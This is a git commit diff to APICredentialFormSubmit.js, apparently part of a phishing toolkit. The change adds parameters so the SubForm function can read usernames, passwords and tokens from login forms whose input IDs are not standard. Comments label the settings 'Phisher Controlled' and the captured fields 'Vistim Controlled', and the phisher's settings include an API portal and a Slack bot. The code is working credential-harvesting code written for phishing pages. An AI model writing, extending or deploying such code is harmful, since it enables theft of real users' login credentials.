b9caba9f14bcc272c98a4ff9851d07592c0deb6f
Curtis Brazzell <curtbraz@gmail.com>
2019-10-28 12:43:39 -0400

    Added JS Function Params for Input IDs in Case They're Not Standard

--- APICredentialFormSubmit.js
+++ APICredentialFormSubmit.js
@@ -1,13 +1,15 @@
-function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji){
+function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID){
 	// Phisher Controlled Variables
 	var APIPortal = SubForm.arguments[0];
 	var FormName = SubForm.arguments[1];
 	var Project = SubForm.arguments[2];
 	var SlackBotName = SubForm.arguments[3];
 	var SlackEmoji = SubForm.arguments[4];
+	var UsernameInputID = SubForm.arguments[5];
+	var PasswordInputID = SubForm.arguments[6];
 	// Vistim Controlled Variables
-	var Username = document.getElementById("username").value;
-	var Password = document.getElementById("password").value;
+	var Username = document.getElementById(UsernameInputID).value;
+	var Password = document.getElementById(PasswordInputID).value;
 	var Token = document.getElementById("token");
     if(Token){
         var Token = Token.value;
